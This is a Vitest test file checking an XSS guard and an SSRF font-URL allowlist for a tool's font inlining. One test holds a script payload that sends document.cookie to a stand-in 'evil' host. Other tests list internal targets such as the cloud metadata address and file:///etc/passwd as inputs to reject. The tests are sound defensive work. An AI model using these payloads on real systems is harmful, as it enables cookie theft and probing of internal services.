import { describe, expect, it } from "vitest";
import { isAllowedFontUrl, neutralizeStyleBreakout } from "./bundle.js";
import {
  ALLOWED_FONT_HOSTS,
  isAllowedFontUrl as isAllowedFontUrlShared,
} from "./font-hosts.js";

describe("neutralizeStyleBreakout (XSS guard for --inline-fonts)", () => {
  it("neutralizes a </style> breakout so fetched CSS cannot inject markup", () => {
    // Regression: an attacker-controlled font stylesheet body of
    // `</style><script>…</script>` used to break out of the <style> wrapper
    // and inject persistent JS into the generated deck.html.
    const malicious =
      "</style><script>fetch('https://evil/?'+document.cookie)</script>";
    const out = neutralizeStyleBreakout(malicious);
    expect(out).not.toMatch(/<\/style/i);
    expect(out).toContain("<\\/style");
  });

  it("is case-insensitive", () => {
    expect(neutralizeStyleBreakout("</STYLE>")).not.toMatch(/<\/style>/i);
  });

  it("leaves benign @font-face CSS untouched", () => {
    const css = "@font-face { font-family: 'X'; src: url(a.woff2); }";
    expect(neutralizeStyleBreakout(css)).toBe(css);
  });
});

describe("isAllowedFontUrl (SSRF guard for --inline-fonts)", () => {
  it("allows known https font CDNs", () => {
    expect(
      isAllowedFontUrl("https://fonts.googleapis.com/css2?family=Inter"),
    ).toBe(true);
    expect(isAllowedFontUrl("https://fonts.gstatic.com/s/inter/x.woff2")).toBe(
      true,
    );
  });

  it("rejects non-allowlisted hosts (SSRF to arbitrary/internal targets)", () => {
    expect(isAllowedFontUrl("https://evil.example.com/x.css")).toBe(false);
    expect(isAllowedFontUrl("http://169.254.169.254/latest/meta-data/")).toBe(
      false,
    );
    expect(isAllowedFontUrl("http://localhost:8080/")).toBe(false);
    expect(isAllowedFontUrl("https://127.0.0.1/")).toBe(false);
  });

  it("rejects non-https schemes and garbage input", () => {
    expect(isAllowedFontUrl("http://fonts.googleapis.com/css")).toBe(false);
    expect(isAllowedFontUrl("file:///etc/passwd")).toBe(false);
    expect(isAllowedFontUrl("not a url")).toBe(false);
  });
});

describe("font-hosts shared allowlist (validate/export render interceptors)", () => {
  it("bundle.ts re-exports the shared helper (single source of truth)", () => {
    expect(isAllowedFontUrl).toBe(isAllowedFontUrlShared);
  });

  it("allows the CDNs the docs promise (Google Fonts + jsdelivr Pretendard)", () => {
    // Regression: validate/export interceptors used to abort ALL non-local
    // requests, so overflow validation measured fallback fonts and exports
    // rendered without the chosen typeface.
    for (const host of [
      "fonts.googleapis.com",
      "fonts.gstatic.com",
      "cdn.jsdelivr.net",
    ]) {
      expect(ALLOWED_FONT_HOSTS.has(host)).toBe(true);
      expect(isAllowedFontUrlShared(`https://${host}/some/font.css`)).toBe(
        true,
      );
    }
    expect(
      isAllowedFontUrlShared(
        "https://cdn.jsdelivr.net/gh/orioncactus/pretendard@v1.3.9/dist/web/variable/pretendardvariable-dynamic-subset.min.css",
      ),
    ).toBe(true);
  });

  it("still blocks everything that is not an allowlisted https font CDN", () => {
    expect(isAllowedFontUrlShared("https://internal.corp/secret.css")).toBe(
      false,
    );
    expect(isAllowedFontUrlShared("http://cdn.jsdelivr.net/x.css")).toBe(false);
  });
});
